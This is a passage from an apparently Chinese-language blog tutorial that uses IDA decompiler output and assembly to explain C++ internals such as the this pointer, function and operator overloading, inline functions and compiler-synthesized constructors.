class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(<span class="keyword">this</span>-&gt;name,<span class="string">&quot;B&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>-&gt;<span class="built_in">fun</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    A *a = <span class="keyword">new</span> <span class="built_in">A</span>();</span><br><span class="line">    B *b = <span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">    a-&gt;<span class="built_in">foo</span>();   </span><br><span class="line">    b-&gt;<span class="built_in">foo</span>();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在调用类函数时，会将其 new 出来的堆内存当做第一个参数传入（相当于传入了该对象的数据结构体）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  A *v3; <span class="comment">// rax</span></span><br><span class="line">  B *v4; <span class="comment">// rax</span></span><br><span class="line">  A *a; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  B *b; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = (A *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">8uLL</span>);</span><br><span class="line">  *v3 = <span class="number">0LL</span>;</span><br><span class="line">  a = v3;</span><br><span class="line">  v4 = (B *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">8uLL</span>);</span><br><span class="line">  *v4 = <span class="number">0LL</span>;</span><br><span class="line">  b = v4;</span><br><span class="line">  A::foo(a);</span><br><span class="line">  B::foo(b);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 This 指针，可以快速操控本实例对象的各个成员：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">A::foo</span><span class="params">(A *<span class="keyword">const</span> <span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *(_WORD *)<span class="keyword">this</span>-&gt;name = <span class="number">65</span>; <span class="comment">// 编译器优化了</span></span><br><span class="line">  Base::fun(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h2><p>C++ 允许在同一作用域中的某个函数和运算符指定多个定义，分别称为：</p>
<ul>
<li>函数重载</li>
<li>运算符重载</li>
</ul>
<p>函数重载：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;int:&quot;</span>&lt;&lt;i&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">double</span> f)</span> </span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;double:&quot;</span>&lt;&lt;f&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Test *t = <span class="keyword">new</span> Test;</span><br><span class="line">    t-&gt;<span class="built_in">print</span>(<span class="number">1</span>);</span><br><span class="line">    t-&gt;<span class="built_in">print</span>(<span class="number">1.1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于类函数来说，编译器会把 [类名称,函数名称,参数列表] 放入哈希函数转化为一个哈希值，并用这个哈希值来当做函数的名称：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">; <span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> main</span></span><br><span class="line"><span class="function">main proc near</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">f</span>= qword ptr <span class="number">-18</span>h</span><br><span class="line">t= qword ptr <span class="number">-8</span></span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, <span class="number">20</span>h</span><br><span class="line">mov     edi, <span class="number">1</span>          ; <span class="keyword">unsigned</span> __int64</span><br><span class="line">call    __Znwm          ; <span class="function"><span class="keyword">operator</span> <span class="title">new</span><span class="params">(ulong)</span></span></span><br><span class="line"><span class="function">mov     [rbp+t], rax</span></span><br><span class="line"><span class="function">mov     rax, [rbp+t]</span></span><br><span class="line"><span class="function">mov     esi, 1          </span>; i</span><br><span class="line">mov     rdi, rax        ; <span class="keyword">this</span></span><br><span class="line">call    _ZN4Test5printEi ; Test::print(<span class="keyword">int</span>)</span><br><span class="line">mov     rdx, cs:qword_2018</span><br><span class="line">mov     rax, [rbp+t]</span><br><span class="line">mov     [rbp+f], rdx</span><br><span class="line">movsd   xmm0, [rbp+f]   ; f</span><br><span class="line">mov     rdi, rax        ; <span class="keyword">this</span></span><br><span class="line">call    _ZN4Test5printEd ; Test::print(<span class="keyword">double</span>)</span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">; &#125; <span class="comment">// starts at 11BA</span></span><br><span class="line">main endp</span><br></pre></td></tr></table></figure>
<ul>
<li>在汇编代码中，程序调用的函数已经确定</li>
<li>那么编译器可能是在语法分析时，就通过参数列表确定了应该调用的函数</li>
</ul>
<p>运算符重载（内部）：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Box</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getVolume</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> length * breadth * height;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setAll</span><span class="params">(<span class="keyword">double</span> len,<span class="keyword">double</span> bre,<span class="keyword">double</span> hei)</span></span>&#123;</span><br><span class="line">        length = len;</span><br><span class="line">        breadth = bre;</span><br><span class="line">        height = hei;</span><br><span class="line">    &#125;</span><br><span class="line">    Box <span class="keyword">operator</span> + (<span class="keyword">const</span> Box&amp; b)&#123; <span class="comment">/* 重载运算符&#x27;+&#x27;(只有&#x27;+&#x27;两边都是Box类型时,才会触发该函数) */</span></span><br><span class="line">        Box box;</span><br><span class="line">        box.length = <span class="keyword">this</span>-&gt;length + b.length;</span><br><span class="line">        box.breadth = <span class="keyword">this</span>-&gt;breadth + b.breadth;</span><br><span class="line">        box.height = <span class="keyword">this</span>-&gt;height + b.height;</span><br><span class="line">        <span class="keyword">return</span> box;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">double</span> length;      </span><br><span class="line">    <span class="keyword">double</span> breadth;     </span><br><span class="line">    <span class="keyword">double</span> height;      </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Box Box1;                </span><br><span class="line">    Box Box2;               </span><br><span class="line">    Box Box3;             </span><br><span class="line">    <span class="keyword">double</span> volume = <span class="number">0.0</span>;     </span><br><span class="line"></span><br><span class="line">    Box1.<span class="built_in">setAll</span>(<span class="number">1.0</span>,<span class="number">1.0</span>,<span class="number">1.0</span>); </span><br><span class="line">    Box2.<span class="built_in">setAll</span>(<span class="number">2.0</span>,<span class="number">2.0</span>,<span class="number">2.0</span>); </span><br><span class="line"></span><br><span class="line">    volume = Box1.<span class="built_in">getVolume</span>();</span><br><span class="line">    volume = Box2.<span class="built_in">getVolume</span>();</span><br><span class="line">    Box3 = Box1 + Box2;</span><br><span class="line">    volume = Box3.<span class="built_in">getVolume</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在一个类中重载运算符过后，其作用范围为整个文件，以及引入该类的其他文件</li>
<li>本质上重载运算符就是调用对应的函数（其参数和返回值必须符合条件）</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Box::<span class="built_in">setAll</span>(&amp;Box1, <span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>);</span><br><span class="line">Box::<span class="built_in">setAll</span>(&amp;Box2, <span class="number">2.0</span>, <span class="number">2.0</span>, <span class="number">2.0</span>);</span><br><span class="line">Box::<span class="built_in">getVolume</span>(&amp;Box1);</span><br><span class="line">volume = Box::<span class="built_in">getVolume</span>(&amp;Box2);</span><br><span class="line">Box::<span class="keyword">operator</span>+(&amp;v4, &amp;Box1, &amp;Box2);</span><br><span class="line">Box3 = v4;</span><br><span class="line">Box::<span class="built_in">getVolume</span>(&amp;Box3);</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Box *__cdecl Box::<span class="keyword">operator</span>+(Box *retstr, Box *<span class="keyword">const</span> <span class="keyword">this</span>, <span class="keyword">const</span> Box *b)</span><br><span class="line">&#123;</span><br><span class="line">  retstr-&gt;length = b-&gt;length + <span class="keyword">this</span>-&gt;length;</span><br><span class="line">  retstr-&gt;breadth = b-&gt;breadth + <span class="keyword">this</span>-&gt;breadth;</span><br><span class="line">  retstr-&gt;height = b-&gt;height + <span class="keyword">this</span>-&gt;height;</span><br><span class="line">  <span class="keyword">return</span> retstr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：Cpp 库中也有许多运算符重载的案例：<code>new</code>，<code>&lt;&lt;</code>，<code>&gt;&gt;</code> 等</li>
</ul>
<p>运算符重载（外部）：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Box</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getVolume</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> length * breadth * height;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setAll</span><span class="params">(<span class="keyword">double</span> len,<span class="keyword">double</span> bre,<span class="keyword">double</span> hei)</span></span>&#123;</span><br><span class="line">        length = len;</span><br><span class="line">        breadth = bre;</span><br><span class="line">        height = hei;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">double</span> length;      </span><br><span class="line">    <span class="keyword">double</span> breadth;     </span><br><span class="line">    <span class="keyword">double</span> height;      </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Box <span class="keyword">operator</span> + (<span class="keyword">const</span> Box&amp; a,<span class="keyword">const</span> Box&amp; b)&#123; </span><br><span class="line">    Box box;</span><br><span class="line">    box.length = a.length + b.length;</span><br><span class="line">    box.breadth = a.breadth + b.breadth;</span><br><span class="line">    box.height = a.height + b.height;</span><br><span class="line">    <span class="keyword">return</span> box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Box Box1;                </span><br><span class="line">    Box Box2;               </span><br><span class="line">    Box Box3;             </span><br><span class="line">    <span class="keyword">double</span> volume = <span class="number">0.0</span>;     </span><br><span class="line"></span><br><span class="line">    Box1.<span class="built_in">setAll</span>(<span class="number">1.0</span>,<span class="number">1.0</span>,<span class="number">1.0</span>); </span><br><span class="line">    Box2.<span class="built_in">setAll</span>(<span class="number">2.0</span>,<span class="number">2.0</span>,<span class="number">2.0</span>); </span><br><span class="line"></span><br><span class="line">    volume = Box1.<span class="built_in">getVolume</span>();</span><br><span class="line">    volume = Box2.<span class="built_in">getVolume</span>();</span><br><span class="line">    Box3 = Box1 + Box2;</span><br><span class="line">    volume = Box3.<span class="built_in">getVolume</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在全局重载运算符过后，其作用范围就是全局（但可以被命名空间限制）</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Box::<span class="built_in">setAll</span>(&amp;Box1, <span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>);</span><br><span class="line">Box::<span class="built_in">setAll</span>(&amp;Box2, <span class="number">2.0</span>, <span class="number">2.0</span>, <span class="number">2.0</span>);</span><br><span class="line">Box::<span class="built_in">getVolume</span>(&amp;Box1);</span><br><span class="line">volume = Box::<span class="built_in">getVolume</span>(&amp;Box2);</span><br><span class="line"><span class="keyword">operator</span>+(&amp;v4, &amp;Box1, &amp;Box2);</span><br><span class="line">Box3 = v4;</span><br><span class="line">Box::<span class="built_in">getVolume</span>(&amp;Box3);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Box *__cdecl <span class="keyword">operator</span>+(Box *retstr, <span class="keyword">const</span> Box *a, <span class="keyword">const</span> Box *b)</span><br><span class="line">&#123;</span><br><span class="line">  retstr-&gt;length = b-&gt;length + a-&gt;length;</span><br><span class="line">  retstr-&gt;breadth = b-&gt;breadth + a-&gt;breadth;</span><br><span class="line">  retstr-&gt;height = b-&gt;height + a-&gt;height;</span><br><span class="line">  <span class="keyword">return</span> retstr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="内联函数"><a href="#内联函数" class="headerlink" title="内联函数"></a>内联函数</h2><p>在类的声明内部声明和定义的函数叫做内联成员函数</p>
<ul>
<li>内联函数类似于宏函数，但内联函数是在编译时展开，而宏在预编译时展开</li>
<li>内联函数的定义和使用必须在同一文件，因此最好将内联函数定义放在头文件中</li>
</ul>
<p>定义在类中的成员函数默认都是内联的，类外定义则要加上 inline（类的成员函数是指那些把定义和原型写在类定义内部的函数）</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>&#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setA</span><span class="params">(<span class="keyword">int</span> _a)</span></span>; <span class="comment">// 普通函数</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setB</span><span class="params">(<span class="keyword">int</span> _b)</span></span>&#123;b = _b;&#125; <span class="comment">// 隐式的内联函数</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">setC</span><span class="params">(<span class="keyword">int</span> _c)</span></span>; <span class="comment">// 显式的内联函数</span></span><br><span class="line">    <span class="keyword">int</span> a,b,c;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 IDA 中分析或者在 GDB 中调试，都发现函数没有内联成功（还是当成普通文件来调用），可能是编译器的原因</li>
</ul>
<h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>以下几种情况下，会合成有用的构造函数：</p>
<ul>
<li>带有默认构造函数的成员对象（例如：string 类）</li>
<li>一个派生类的父类带有构造函数（或者父类的成员对象带有默认构造函数），那么子类：<ul>
<li>如果没有定义构造函数，则会合成默认构造函数</li>
<li>如果有构造函数，但是没有调用父类的构造函数，则编译器会插入一些代码调用父类的默认构造函数</li>
</ul>
</li>
<li>带有一个虚函数的类<ul>
<li>类声明（或继承）一个虚函数</li>
<li>类派生自一个继承串链，其中有一个或更多的虚基类</li>
</ul>
</li>
</ul>
<p>案例一：带有默认构造函数的成员对象</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span>  </span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string name;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Test t;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>IDA 分析：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Test t; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  Test::<span class="built_in">Test</span>(&amp;t);</span><br><span class="line">  Test::~<span class="built_in">Test</span>(&amp;t);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>由于 Test 类中的 string 类带有默认构造函数，因此 Test 类会合成一个构造函数：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">Test::Test</span><span class="params">(Test *<span class="keyword">const</span> <span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>案例二：没有定义构造函数，则会合成默认构造函数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span>  </span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Test1</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span> :</span> <span class="keyword">public</span> Test1&#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Test1::<span class="built_in">Test1</span>(<span class="keyword">void</span>)&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Test1&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	Test2 t;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>IDA 分析：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Test2 t; <span class="comment">// [rsp+17h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  Test2::<span class="built_in">Test2</span>(&amp;t);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>由于 Test2 没有构造函数，但父类 Test1 有构造函数，因此在 Test2 的构造函数中会调用 Test1 的构造函数：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">Test2::Test2</span><span class="params">(Test2 *<span class="keyword">const</span> <span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Test1::<span class="built_in">Test1</span>(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>案例三：如果有构造函数，但是没有调用父类的构造函数，则编译器会插入一些代码调用父类的默认构造函数</p>
